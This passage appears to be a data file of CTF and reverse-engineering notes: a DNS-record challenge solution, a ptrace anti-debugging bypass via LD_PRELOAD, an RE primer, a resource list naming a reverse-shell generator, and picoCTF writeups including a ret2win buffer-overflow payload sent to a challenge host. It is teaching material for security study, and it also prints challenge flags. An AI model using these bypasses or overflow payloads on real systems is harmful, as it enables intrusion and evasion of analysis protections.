Y3Nke2RuNV9tMTlIVF9CM19LMU5ENF9XME5LeX0=

Decoded:

csd{dn5_m19HT_B3_K1ND4_W0NKy}

### Final Flag

csd{dn5_m19HT_B3_K1ND4_W0NKy}

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*yf11bQ-WDIZvVN1U9KthKw.png)

### DNS Chain Summary

krampus.csd.lol  
  └─> _dmarc (ruf field)  
      └─> ops.krampus.csd.lol  
          └─> _metrics._tcp SRV  
              └─> beacon.krampus.csd.lol  
                  └─> config (base64)  
                      └─> exfil.krampus.csd.lol  
                          └─> DKIM selector  
                              └─> syndicate._domainkey (FLAG!)`,
  },
  {
    id: "day-4",
    title: "Main anti-debugging check:",
    excerpt: "CyberStudents Day 4 challenge writeup covering additional CTF techniques and problem-solving approaches for flag discovery.",
    category: "CTF Writeup",
    content: `Here is the challenge description:
![Image](/MyNotes/images/Pasted_image_20251221233819.png)

Downloading the binary we get this:
![Image](/MyNotes/images/Pasted_image_20251221234116.png)

Output Analysis:
- ELF 64-bit LSB pie executable - Linux 64-bit executable with Position Independent Execution
- x86-64 - Intel/AMD 64-bit architecture
- dynamically linked - Uses shared libraries
- stripped - Debug symbols removed, making analysis harder
- for GNU/Linux 3.2.0 - Target Linux version
- 
Key Insight: The "stripped" designation meant I wouldn't have function names or debug symbols, requiring more manual analysis.


From the strings output we get several things:
	1. fgets() is used so definetly not Buffer Overflow
	2. There is a success message and a Fail message 
	3. Critical Strings Identified:
	4. "Nice try, but Santa sees when you're peeking!" - Anti-debugging message
	5. "Coal for you! Tampering detected." - Additional anti-tampering message
	6. "Jingle laughs. Wrong credential length!" - Length validation failure
	7. "Welcome to the mainframe, Operative. Jingle owes the elves a round." - Success message
	8. "Access Denied. Jingle smirks." - Content validation failure
	9. Encoded strings: "!1&9s,6r", "/vs,$0v/q?", "9*3$\\"" - Likely encrypted data

Key Functions Detected:
- ptrace - Anti-debugging system call
- fgets, strlen, strcspn - Input handling functions
- __printf_chk, puts - Output functions
	

![Image](/MyNotes/images/Pasted_image_20251221234635.png)

Running the binary we get: (With a fail message)
![Image](/MyNotes/images/Pasted_image_20251221234745.png)

Analysis:
- The program expects user input (access code)
- It immediately rejects input with a "wrong credential length" message
- This suggests it's checking input length before content validation


Using Ltrace is also unsuccessful
![Image](/MyNotes/images/Pasted_image_20251221234901.png)
Strategic Insight: The presence of ptrace indicated sophisticated anti-debugging protection that would need to be bypassed.

Analysis:
- The ptrace(0, 0, 0, 0) call with return value -1 indicates the program is checking if it's being debugged
- When ptrace returns -1, it means another process (debugger) is already tracing this process
- The program immediately exits with the anti-debugging message

I also tried system call tracing:
bash
echo "test" | strace -e trace=write ./day4 2>&1

This also triggered the anti-debugging protection, confirming the binary actively detects analysis attempts.

### Step 5: Disassembly Analysis to Understand Anti-Debugging Mechanism

I disassembled the binary to locate the ptrace call:

bash
objdump -d day4 | grep -A 10 -B 5 ptrace

# Main anti-debugging check:
    1145: 31 c9                xor    %ecx,%ecx      # Clear ECX (4th arg)
    1147: 31 d2                xor    %edx,%edx      # Clear EDX (3rd arg)  
    1149: 31 f6                xor    %esi,%esi      # Clear ESI (2nd arg)
    114b: 31 ff                xor    %edi,%edi      # Clear EDI (1st arg)
    114d: 31 c0                xor    %eax,%eax      # Clear EAX (syscall number)
    114f: e8 bc ff ff ff       call   1110 <ptrace@plt>  # Call ptrace(0,0,0,0)
    1154: 48 ff c0             inc    %rax           # Increment return value
    1157: 75 16                jne    116f           # Jump if NOT zero (not being debugged)
    1159: 48 8d 3d a0 0e 00 00 lea    0xea0(%rip),%rdi  # Load anti-debug message
    1160: e8 5b ff ff ff       call   10c0 <puts@plt>   # Print message
    1165: bf 01 00 00 00       mov    $0x1,%edi      # Exit code 1
    116a: e8 c1 ff ff ff       call   1130 <exit@plt>   # Exit program


Technical Analysis:
- ptrace(PTRACE_TRACEME, 0, 0, 0) - Attempts to trace itself
- If already being traced by a debugger, returns -1
- The code increments the return value (inc %rax)
- If result is not zero (meaning original return was -1), it jumps to the anti-debug message

### Creating a Ptrace Bypass


file: detailed_bypass.c (using tool: write)

 #include <stdio.h>
#include <sys/ptrace.h>
long ptrace(int request, ...) {
fprintf(stderr, "[BYPASS] ptrace() called with request=%d, returning 0\\n", request);
return 0;  // Always return success

 run the following command: 
			 gcc -shared -fPIC detailed_bypass.c -o detailed_bypass.so 
Purpose: Compile the detailed bypass

 run the following command:
			 echo -n "test" | LD_PRELOAD=./detailed_bypass.so ./day4 
Purpose: Show the bypass in action with debug output

NPLD Mainframe Authentication
Enter access code: Jingle laughs. Wrong credential length!
[BYPASS] ptrace() called with request=0, returning 0
 
1. [BYPASS] ptrace() called with request=0 - My function was called instead of the real ptrace
2. returning 0 - I forced it to return success
3. The program continued normally instead of showing the anti-debug message

### Why This Works: Dynamic Linking Explained

When a program calls a library function:

1. Compile time: The binary contains a reference to ptrace@plt (Procedure Linkage Table)
2. Runtime: The dynamic linker resolves this to the actual function address
3. LD_PRELOAD: Forces the linker to check my library FIRST

Let me show you the actual linking process:

I will run the following command: 
				echo "Libraries loaded by day4 normally:" && ldd ./day4 (using tool: shell)
Purpose: Show normal library dependencies

Libraries loaded by day4 normally:
	linux-vdso.so.1 (0x00007f8876a32000)
	libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007f8876600000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f8876a34000)


I will run the following command: 
				echo "With LD_PRELOAD:" && LD_PRELOAD=./bypass_ptrace.so ldd ./day4
Purpose: Show library loading with preload

With LD_PRELOAD:
	linux-vdso.so.1 (0x00007ffae4bf2000)
	./bypass_ptrace.so (0x00007ffae4be0000)
	libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007ffae4800000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffae4bf4000)

> See the difference? My bypass_ptrace.so is loaded BEFORE libc.so.6, so when the binary looks for ptrace, it finds MY version first!

### The Complete Flow

Without bypass:
1. Binary calls ptrace(PTRACE_TRACEME, 0, 0, 0)
2. Dynamic linker finds ptrace in libc.so.6
3. Real ptrace() executes → returns -1 (being debugged)
4. Binary detects debugging → exits with anti-debug message


With bypass:
1. Binary calls ptrace(PTRACE_TRACEME, 0, 0, 0)  
2. Dynamic linker finds ptrace in MY bypass_ptrace.so FIRST
3. My fake ptrace() executes → returns 0 (fake success)
4. Binary thinks it's not being debugged → continues normally


### Why Return 0?

Looking back at the assembly:
assembly
114f: call ptrace           # Call ptrace
1154: inc  %rax            # Increment return value  
1157: jne  116f            # Jump if result != 0


If ptrace returns 0 (not being debugged):
- inc %rax makes it 1
- jne jumps to normal execution (address 116f)

If ptrace returns -1 (being debugged):
- inc %rax makes it 0  
- jne doesn't jump, falls through to anti-debug message

By returning 0, I make the binary think it's not being debugged!

This is a classic technique in malware analysis and reverse engineering - using LD_PRELOAD to intercept and modify system calls without 
actually patching the binary itself.



### Step 7: Deep Disassembly Analysis of Main Logic

With anti-debugging bypassed, I analyzed the main program flow:

bash
objdump -d day4 | grep -A 50 "1140"


Critical Code Sections Identified:

Input Reading Section (addresses 11b3-11c2):
assembly
11b3: 48 8b 15 56 2e 00 00  mov    0x2e56(%rip),%rdx    # Load stdin
11ba: be 40 00 00 00             mov    $0x40,%esi                 # Buffer size 64 bytes
11bf: 48 89 df                          mov    %rbx,%rdi                  # Buffer address
11c2: e8 39 ff ff ff                    call   1100 <fgets@plt>           # Read input


String Processing (addresses 11cc-11db):
assembly
11cc: 48 89 df                                 mov    %rbx,%rdi            # Input string
11cf: 48 8d 35 ac 0e 00 00            lea    0xeac(%rip),%rsi     # "\\n" character
11d6: e8 15 ff ff ff                           call   10f0 <strcspn@plt>  # Find newline
11db: 48 89 df                                 mov    %rbx,%rdi            # Input string
11de: c6 44 04 08 00                      movb   $0x0,0x8(%rsp,%rax,1) # Null terminate


Length Validation (addresses 11e3-11fa):
assembly
11e3: e8 e8 fe ff ff                  call   10d0 <strlen@plt>         # Get string length
11e8: 48 83 f8 17                    cmp    $0x17,%rax              # Compare with 23 (0x17)
11ec: 74 0e                               je     11fc                              # Jump if equal to 23
11ee: 48 8d 3d 8f 0e 00 00     lea    0xe8f(%rip),%rdi       # "Wrong length" message
11f5: e8 c6 fe ff ff                    call   10c0 <puts@plt>            # Print error
11fa: eb 28                                jmp    1224                           # Exit


Key Discovery: The program requires exactly 23 characters (0x17 in hex).

### Step 8: Testing Length Requirement

I verified the length requirement:

bash
echo -n "12345678901234567890123" | wc -c  # Outputs: 23
echo -n "12345678901234567890123" | LD_PRELOAD=./bypass_ptrace.so ./day4


Output:
NPLD Mainframe Authentication
Enter access code: Access Denied. Jingle smirks.


Success! The length check passed, but content validation failed. This confirmed the 23-character requirement and revealed there's a 
content validation step.

### Step 9: Analysis of Validation Functions

I analyzed the validation functions called after length check:

bash
objdump -d day4 | grep -A 30 "1339:"

Main Validation Function (1362):
assembly
1362: f3 0f 1e fa                              endbr64
1366: 31 c0                                       xor    %eax,%eax              # Counter = 0
1368: 48 8d 0d a1 0d 00 00            lea    0xda1(%rip),%rcx    # Load reference string (0x2110)

# Main validation loop:
136f: 0f be 14 07             movsbl (%rdi,%rax,1),%edx      # Load input[i] (sign-extended)
1373: 0f b6 34 01            movzbl (%rcx,%rax,1),%esi       # Load reference[i] (zero-extended)
1377: 83 f2 42                  xor    $0x42,%edx                      # XOR input[i] with 0x42
137a: 39 f2                       cmp    %esi,%edx                       # Compare with reference[i]
137c: 75 0f                        jne    138d                                   # Jump if not equal (fail)
137e: 48 ff c0                   inc    %rax                                    # i++
1381: 48 83 f8 17           cmp    $0x17,%rax                       # Compare i with 23
1385: 75 e8                       jne    136f                                    # Continue loop if i < 23
1387: b8 01 00 00 00      mov    $0x1,%eax                       # Return 1 (success)
138c: c3                             ret
138d: 31 c0                       xor    %eax,%eax                       # Return 0 (failure)
138f: c3                             ret


Critical Algorithm Discovery:
1. Loop through each of the 23 input characters
2. XOR each input character with 0x42
3. Compare result with corresponding byte in reference string at address 0x2110
4. All 23 comparisons must match for success

### Step 10: Extracting the Reference String

I extracted the reference data from the binary's read-only data section:

bash
objdump -s -j .rodata day4 | grep -A 10 2110


Output:
2110 21312639 732c3672 1d362a71 1d2f7673  !1&9s,6r.6*q./vs
2120 2c243076 2f713f                      ,$0v/q?


Hex Data Extraction:
- Address 0x2110: 21 31 26 39 73 2c 36 72 1d 36 2a 71 1d 2f 76 73
- Address 0x2120: 2c 24 30 76 2f 71 3f
- Total: 23 bytes (exactly matching the required input length)

### Step 11: Decryption Algorithm Implementation

I implemented the reverse of the validation algorithm:

python
# Reference string from binary
ref_hex = "21312639732c36721d362a711d2f76732c243076" + "2f713f"
ref_bytes = bytes.fromhex(ref_hex)

print(f"Reference length: {len(ref_bytes)}")  # Verify 23 bytes

# Reverse the XOR operation: if (input XOR 0x42) == reference, 
# then input == (reference XOR 0x42)
decoded = [byte ^ 0x42 for byte in ref_bytes]
access_code = ''.join(chr(x) for x in decoded)

print(f"Decoded access code: {access_code}")


Mathematical Verification:
- Original validation: (input[i] XOR 0x42) == reference[i]
- Reverse operation: input[i] == (reference[i] XOR 0x42)
- XOR is its own inverse: (A XOR B) XOR B == A

Result: csd{1nt0_th3_m41nfr4m3}

### Step 12: Final Validation and Testing

I tested the decoded access code:

bash
echo -n "csd{1nt0_th3_m41nfr4m3}" | LD_PRELOAD=./bypass_ptrace.so ./day4


Output:
NPLD Mainframe Authentication
Enter access code: Welcome to the mainframe, Operative. Jingle owes the elves a round.


I also verified it works without the ptrace bypass:

bash
echo -n "csd{1nt0_th3_m41nfr4m3}" | ./day4


Same successful output! This confirmed the access code was correct and the binary's normal execution path worked properly.

### Step 13: Comprehensive Technical Summary

Security Mechanisms Encountered:
1. Anti-debugging via ptrace() - Detected and blocked debugging attempts
2. Symbol stripping - Removed function names and debug information
3. Anti-tampering check - Verified integrity using magic value 0xdeadbeef
4. Input validation - Required exact 23-character length
5. Encryption - XOR cipher with key 0x42

`,
  },
  {
    id: "intro",
    title: "TryHackMe — Reverse Engineering Introduction",
    excerpt: "TryHackMe introduction to reverse engineering covering fundamental concepts, tools setup, and basic binary analysis techniques for beginners.",
    category: "Reverse Engineering",
    content: `# TryHackMe — Reverse Engineering Introduction

> **Platform**: [TryHackMe](https://tryhackme.com) | **Topic**: Reverse Engineering Fundamentals | **Difficulty**: Beginner → Intermediate

---

## 1. What is Reverse Engineering?

**Reverse engineering** (RE) is the process of analyzing a compiled binary to understand what it does **without having access to the source code**.

### Why Learn RE?
| Use Case | Description |
|---|---|
| **Malware Analysis** | Understand what malicious software does, extract IOCs |
| **Vulnerability Research** | Find bugs in closed-source software |
| **CTF Competitions** | Solve crackmes, keygens, flag extraction challenges |
| **Software Security** | Audit binaries for backdoors, verify patches |
| **Exploit Development** | Understand program behavior to craft exploits |
| **Game Hacking** | Understand game internals (educational) |

---

## 2. Core Concepts

### Compilation Pipeline
\`\`\`
Source Code (.c/.cpp)
    |
    v
Preprocessor --> Compiler --> Assembler --> Linker
    |               |            |            |
  .i file       .s (asm)     .o (object)   ELF/PE binary
\`\`\`

### Key Terms
| Term | Definition |
|---|---|
| **Disassembly** | Converting machine code → assembly instructions |
| **Decompilation** | Converting machine code → pseudo-C code (approximate) |
| **Static Analysis** | Analyzing without executing (disassembler) |
| **Dynamic Analysis** | Analyzing while running (debugger) |
| **Debugging** | Stepping through code, examining memory/registers |
| **Patching** | Modifying binary instructions to change behavior |
| **ELF** | Executable and Linkable Format (Linux binaries) |
| **PE** | Portable Executable (Windows binaries) |

---

## 3. Essential RE Tools

### Disassemblers / Decompilers
| Tool | Platform | Cost | Best For |
|---|---|---|---|
| **Ghidra** | All | Free | Full RE with decompiler (NSA) |
| **IDA Pro** | All | $$$$ | Industry standard |
| **IDA Free** | All | Free | Disassembly only (no decompiler) |
| **Cutter** | All | Free | Rizin-based, modern UI |
| **Binary Ninja** | All | $$ | Clean HLIL decompiler |
| **radare2** | All | Free | CLI-based, scriptable |

### Debuggers
| Tool | Platform | Best For |
|---|---|---|
| **GDB + Pwndbg** | Linux | Binary exploitation, CTF |
| **GDB + GEF** | Linux | Similar to Pwndbg, different UI |
| **x64dbg** | Windows | Windows RE, malware analysis |
| **WinDbg** | Windows | Kernel debugging, crash analysis |
| **OllyDbg** | Windows | Legacy 32-bit debugging |

### Supporting Tools
| Tool | Purpose |
|---|---|
| \`file\` | Identify file type (ELF, PE, script, etc.) |
| \`strings\` / \`FLOSS\` | Extract readable text from binaries |
| \`ltrace\` | Trace library function calls |
| \`strace\` | Trace system calls |
| \`objdump\` | Disassemble sections, view headers |
| \`readelf\` | Parse ELF structure |
| \`checksec\` | Check binary protections (NX, ASLR, canary, PIE) |
| \`nm\` | List symbols in binary |
| \`ldd\` | List shared library dependencies |

---

## 4. x86/x64 Assembly Essentials

### Registers (x64)
| Register | Purpose | Notes |
|---|---|---|
| \`RAX\` | Return value, accumulator | Function return values |
| \`RBX\` | Base register | Callee-saved |
| \`RCX\` | Counter, 1st arg (Windows) / 4th arg (Linux) | Loop counter |
| \`RDX\` | Data, 2nd arg (Windows) / 3rd arg (Linux) | Division |
| \`RSI\` | Source index, 2nd arg (Linux) | String operations |
| \`RDI\` | Destination index, 1st arg (Linux) | String operations |
| \`RSP\` | Stack pointer | Always points to top of stack |
| \`RBP\` | Base pointer | Frame pointer |
| \`RIP\` | Instruction pointer | Next instruction to execute |
| \`R8-R15\` | General purpose (x64 only) | R8/R9 = 5th/6th args (Linux) |

### Calling Conventions
| Convention | Args 1-6 | Return | Caller/Callee Saved |
|---|---|---|---|
| **Linux x64 (System V)** | RDI, RSI, RDX, RCX, R8, R9 | RAX | Caller: RAX,RCX,RDX,R8-R11 |
| **Windows x64** | RCX, RDX, R8, R9 (+ shadow space) | RAX | Caller: RAX,RCX,RDX,R8-R11 |
| **Linux x86 (cdecl)** | Stack (right-to-left push) | EAX | Caller cleans stack |

### Essential Instructions
| Instruction | Meaning | Example |
|---|---|---|
| \`mov dst, src\` | Move/copy value | \`mov rax, rbx\` |
| \`push val\` | Push to stack (RSP -= 8) | \`push rbp\` |
| \`pop dst\` | Pop from stack (RSP += 8) | \`pop rbp\` |
| \`lea dst, [addr]\` | Load effective address (no dereference) | \`lea rax, [rbp-0x10]\` |
| \`call func\` | Push return addr, jump to function | \`call 0x401000\` |
| \`ret\` | Pop return addr, jump to it | Return from function |
| \`cmp a, b\` | Compare (sets flags, no store) | \`cmp eax, 0\` |
| \`test a, b\` | AND (sets flags, no store) | \`test eax, eax\` (check zero) |
| \`je/jz\` | Jump if equal/zero | After \`cmp\` |
| \`jne/jnz\` | Jump if not equal/not zero | After \`cmp\` |
| \`jmp addr\` | Unconditional jump | \`jmp 0x401050\` |
| \`xor a, a\` | Zero out register | \`xor eax, eax\` (eax = 0) |
| \`nop\` | No operation | NOP sled, padding |
| \`syscall\` | System call (x64 Linux) | After setting RAX = syscall # |
| \`int 0x80\` | System call (x86 Linux) | After setting EAX = syscall # |

---

## 5. Common RE Patterns

### Function Prologue & Epilogue
\`\`\`asm
; Prologue - sets up stack frame
push rbp          ; Save old base pointer
mov rbp, rsp      ; Set new base pointer
sub rsp, 0x20     ; Allocate 32 bytes for local variables

; ... function body ...

; Epilogue - tears down stack frame
leave             ; mov rsp, rbp; pop rbp
ret               ; Return to caller
\`\`\`

### If/Else Pattern
\`\`\`asm
cmp eax, 5        ; if (x == 5)
jne else_branch    ;   if not equal, jump to else
; ... then code ...
jmp end_if
else_branch:
; ... else code ...
end_if:
\`\`\`

### Loop Pattern
\`\`\`asm
mov ecx, 10       ; counter = 10
loop_start:
; ... loop body ...
dec ecx            ; counter--
jnz loop_start     ; if counter != 0, loop again
\`\`\`

### String Comparison
\`\`\`asm
lea rdi, [user_input]    ; arg1 = user input
lea rsi, [correct_pass]  ; arg2 = correct password
call strcmp               ; compare strings
test eax, eax            ; check result
je access_granted         ; if equal -> success
\`\`\`

---

## 6. RE Methodology for CTF

### Step 1: Reconnaissance
\`\`\`bash
file challenge           # What type of binary?
checksec challenge       # What protections?
strings challenge        # Any visible strings?
ltrace ./challenge       # What library calls?
\`\`\`

### Step 2: Static Analysis
\`\`\`bash
# Load into Ghidra or Cutter
# Find main()
# Read decompiled code
# Identify: input, validation logic, success/fail paths
\`\`\`

### Step 3: Dynamic Analysis
\`\`\`bash
# Load into GDB with Pwndbg
gdb ./challenge
> break main
> run
> step/next through code
> examine registers and memory
\`\`\`

### Step 4: Common CTF Challenges

| Challenge Type | What to Do |
|---|---|
| **Password check** | Find \`strcmp\`/custom compare, extract correct password |
| **XOR encryption** | Find XOR loop, extract key and ciphertext |
| **Flag in memory** | Run in debugger, break after decode, read memory |
| **Anti-debug** | Patch out \`ptrace\` / \`IsDebuggerPresent\` checks |
| **Keygen** | Understand validation algorithm, write keygen |
| **Obfuscated** | De-obfuscate: XOR strings, base64, custom encoding |
| **Packed** | Unpack first (UPX, custom), then analyze |
| **Multi-stage** | Follow execution flow through unpacking/decoding stages |

---

## 7. Linux Syscalls Reference (x86/x64)

### Common Syscalls
| Syscall | x86 (EAX) | x64 (RAX) | Purpose |
|---|---|---|---|
| \`read\` | 3 | 0 | Read from file descriptor |
| \`write\` | 4 | 1 | Write to file descriptor |
| \`open\` | 5 | 2 | Open file |
| \`close\` | 6 | 3 | Close file descriptor |
| \`execve\` | 11 | 59 | Execute program |
| \`exit\` | 1 | 60 | Exit process |
| \`mmap\` | 90 | 9 | Map memory |
| \`mprotect\` | 125 | 10 | Change memory protections |
| \`fork\` | 2 | 57 | Create child process |
| \`ptrace\` | 26 | 101 | Debug process (anti-debug target) |

---

## 8. Recommended TryHackMe Rooms for RE

| Room | Difficulty | Focus |
|---|---|---|
| **Intro to x86-64** | Easy | Assembly basics |
| **Reverse Engineering** | Easy | Basic RE methodology |
| **Crackme** | Easy-Medium | Password cracking |
| **Ghidra** | Medium | Using Ghidra for RE |
| **Radare2** | Medium | radare2 commands |
| **Buffer Overflow Prep** | Medium | Stack overflow basics |
| **Binex** | Medium | Binary exploitation |
| **Gatekeeper** | Medium | Real-world buffer overflow |
| **Brainstorm** | Hard | Advanced buffer overflow |
| **RE (Challenge)** | Hard | Put it all together |

---

## 9. Practice Path

\`\`\`
1. Learn x86 assembly basics (registers, instructions, stack)
2. Get comfortable with GDB + Pwndbg
3. Solve easy crackmes (crackmes.one)
4. Learn to use Ghidra/Cutter decompiler
5. Understand common vulnerability classes (BOF, format strings)
6. Progress to binary exploitation (pwntools, ROP)
7. Try malware analysis (combine static + dynamic RE)
\`\`\`

---

## Pro Tips

> **Read the decompiler output, not just assembly** — Ghidra's decompiler turns 50 lines of ASM into 10 lines of C. Start there, then verify with assembly when things look wrong.

> **Rename functions and variables as you go** — In Ghidra/IDA, press \`L\` to rename. \`FUN_004010a0\` means nothing. \`check_password\` means everything.

> **Dynamic > Static for beginners** — When stuck, run it in GDB. Set breakpoints before and after interesting code. Examine registers. Watch values change in real-time.

> **Learn to read compiler patterns** — Compilers generate predictable code for \`if/else\`, \`for\`, \`while\`, \`switch\`. Once you recognize the patterns, RE becomes much faster.


`,
  },
  {
    id: "hacking-resources",
    title: "Hacking Resources & Bookmarks",
    excerpt: "Curated collection of hacking and cybersecurity resources including learning platforms, tools, reference materials, and practice environments.",
    category: "Resources",
    content: `# Hacking Resources & Bookmarks
> Source: [Crypto-Cat CTF Resources](https://github.com/Crypto-Cat/CTF#readme) | [HackTricks](https://book.hacktricks.wiki/)

---

## Reference Wikis
- [HackTricks](https://book.hacktricks.wiki/en/index.html) — Pentesting methodology, binary exploitation, web vulns, crypto, stego
- [HackTricks Cloud](https://cloud.hacktricks.wiki/) — AWS, GCP, Azure, Kubernetes, CI/CD
- [GTFOBins](https://gtfobins.org/) — Unix binary privesc
- [OWASP](https://owasp.org/) — Web security standards

---

## Tools

| Tool | Purpose | Link |
|---|---|---|
| **Ghidra** | Reverse engineering (NSA) | [GitHub](https://github.com/NationalSecurityAgency/ghidra) |
| **Pwntools** | CTF exploit framework (Python) | [Tutorial](https://github.com/Gallopsled/pwntools-tutorial) |
| **CyberChef** | Encoding/decoding/crypto Swiss knife | [Online](https://gchq.github.io/CyberChef/) |
| **Volatility** | Memory forensics | [Wiki](https://github.com/volatilityfoundation/volatility/wiki/Linux) |
| **Nuclei** | Vulnerability scanner | [GitHub](https://github.com/projectdiscovery/nuclei) |
| **ExploitDB** | Public exploit database | [exploit-db.com](https://www.exploit-db.com/) |
| **RevShells** | Reverse shell generator | [revshells.com](https://www.revshells.com/) |
| **DCode** | Cipher/code decoder | [dcode.fr](https://www.dcode.fr/en) |
| **Decompiler** | Online decompilation | [decompiler.com](https://www.decompiler.com/) |
| **TIO** | Run code online (200+ langs) | [tio.run](https://tio.run/) |

---

## YouTube Channels (Security)

| Channel | Focus |
|---|---|
| [John Hammond](https://www.youtube.com/@_JohnHammond) | CTF, malware analysis |
| [Low Level](https://www.youtube.com/@LowLevelTV) | Systems programming, RE |
| [LiveOverflow](https://www.youtube.com/@LiveOverflow) | Binary exploitation, browser hacking |
| [IppSec](https://www.youtube.com/@ippsec) | HackTheBox walkthroughs |
| [PwnFunction](https://www.youtube.com/@PwnFunction) | Web security animations |
| [StackSmashing](https://www.youtube.com/@stacksmashing) | Hardware hacking, RE |
| [LaurieWired](https://www.youtube.com/@lauriewired) | Malware RE |
| [CryptoCat](https://www.youtube.com/@_CryptoCat) | CTF walkthroughs, pwn tutorials |
| [HackerSploit](https://www.youtube.com/@HackerSploit) | Pentesting tutorials |
| [TheCyberMentor](https://www.youtube.com/@TCMSecurityAcademy) | Ethical hacking, OSCP |
| [NahamSec](https://www.youtube.com/@NahamSec) | Bug bounty |
| [GuidedHacking](https://www.youtube.com/@GuidedHacking) | Game hacking, RE |

---

## More Resources
- [Learn RE](https://hshrzd.wordpress.com/how-to-start/) — How to start reverse engineering
- [Learn BinExp (Nightmare)](https://guyinatuxedo.github.io/) — Binary exploitation course
- [Awesome CTF](https://github.com/apsdehal/awesome-ctf) — Curated CTF resources
- [Bug Bounty Resources](https://www.hacker101.com/resources.html) — Hacker101
- [Bug Bounty Platforms](https://github.com/disclose/bug-bounty-platforms) — Platform list
- [Awesome Forensics](https://cugu.github.io/awesome-forensics/) — DFIR tools & resources
- [0xdf Writeups](https://0xdf.gitlab.io/) — HackTheBox writeups
- [OWASP MASTG](https://mas.owasp.org/MASTG/) — Mobile security testing guide

---

## HackTricks Quick Navigation

### Binary Exploitation
- [Methodology](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
- [Stack Overflow](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflow/index.html)
- [Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html)
- [Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html)
- [Protections & Bypasses](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [Write-What-Where → Exec](https://book.hacktricks.wiki/en/binary-exploitation/arbitrary-write-2-exec/index.html)

### Pentesting
- [Pentesting Methodology](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html)
- [Linux PrivEsc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [Windows PrivEsc](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [Active Directory](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [Web Vulnerabilities](https://book.hacktricks.wiki/en/pentesting-web/web-vulnerabilities-methodology.html)

### Other
- [Reversing Tools](https://book.hacktricks.wiki/en/reversing/reversing-tools-basic-methods/index.html)
- [Common Malware APIs](https://book.hacktricks.wiki/en/reversing/common-api-used-in-malware.html)
- [Crypto](https://book.hacktricks.wiki/en/crypto/index.html)
- [Stego](https://book.hacktricks.wiki/en/stego/index.html)
- [Forensics](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/index.html)
`,
  },
  {
    id: "01-quizploit-writeup",
    title: "Quizploit Writeup",
    excerpt: "picoCTF Quizploit writeup exploiting a quiz application through buffer overflow to redirect execution and capture the flag.",
    category: "picoCTF - Binary Exploitation",
    content: `# Quizploit Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln\`, \`vuln.c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`gdb-pwndbg\`
- \`nc\`

## 1) Inspect binary basics

\`\`\`bash
file vuln
\`\`\`

From this, answer architecture/linking/stripped questions.

## 2) Check protections

\`\`\`bash
checksec --file=vuln
\`\`\`

Use this for NX/protection questions.

## 3) Read source for buffer and read size

\`\`\`bash
cat vuln.c
\`\`\`

Extract:
- buffer size in \`vuln()\`
- input read size
- overflow amount (\`read_size - buffer_size\`)

## 4) Confirm symbols and \`win\` function

\`\`\`bash
objdump -d vuln | rg "<win>|<vuln>|<main>"
\`\`\`

Or in GDB:

\`\`\`bash
gdb-pwndbg vuln
info functions
\`\`\`

## 5) Connect and answer quiz

\`\`\`bash
nc lonely-island.picoctf.net 56027
\`\`\`

I answered using values collected from the commands above.

## Final answers used (solved run)

- \`64-bit\`
- \`dynamic\`
- \`not stripped\`
- \`0x15\`
- \`0x90\`
- \`yes\`
- \`fgets\`
- \`win\`
- \`buffer overflow\`
- \`0x7b\`
- \`NX\`
- \`ROP\`
- \`0x401176\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "02-echo-escape-2-writeup",
    title: "Echo Escape 2 Writeup",
    excerpt: "picoCTF Echo Escape 2 writeup using format string vulnerabilities to leak and overwrite memory for shell access.",
    category: "picoCTF - Binary Exploitation",
    content: `# Echo Escape 2 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln (1)\`, \`vuln (1).c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`python3\`
- \`nc\`

## 1) Inspect the binary

\`\`\`bash
file "vuln (1)"
checksec --file="vuln (1)"
\`\`\`

Observed a 32-bit non-PIE target suitable for ret2win.

## 2) Find \`win()\` address

\`\`\`bash
objdump -d "vuln (1)" | rg "<win>"
\`\`\`

Address used:
- \`0x08049276\`

## 3) Calculate EIP overwrite offset

\`\`\`bash
objdump -d "vuln (1)" | sed -n '/<vuln>:/,/^$/p'
\`\`\`

Stack math:
- buffer at \`ebp-0x28\`
- saved return at \`ebp+0x4\`
- offset = \`0x28 + 0x4 = 0x2c\` = \`44\`

## 4) Build payload

\`\`\`bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I",0x08049276) + b"\\n")'
\`\`\`

## 5) Exploit remote

\`\`\`bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I",0x08049276) + b"\\n")' | nc dolphin-cove.picoctf.net 53772
\`\`\`

## Why it works

\`fgets(buf, 128, stdin)\` overflows \`buf\`, overwrites saved return address, and returns into \`win()\`.

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "03-tea-cash-writeup",
    title: "tea-cash Writeup",
    excerpt: "picoCTF Tea-Cash writeup exploiting a virtual currency application through integer overflow or logic flaws to gain unauthorized funds.",
    category: "picoCTF - Binary Exploitation",
    content: `# tea-cash Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`heapedit\`, \`heapedit.c\`
- Tools:
- \`cat\`
- \`nc\`
- \`python3\` (for address arithmetic helper)

## 1) Understand program logic

\`\`\`bash
cat heapedit.c
\`\`\`

Program behavior:
- allocates 6 chunks of size \`0x80\`
- stores flag in chunk 6
- frees chunks in reverse order
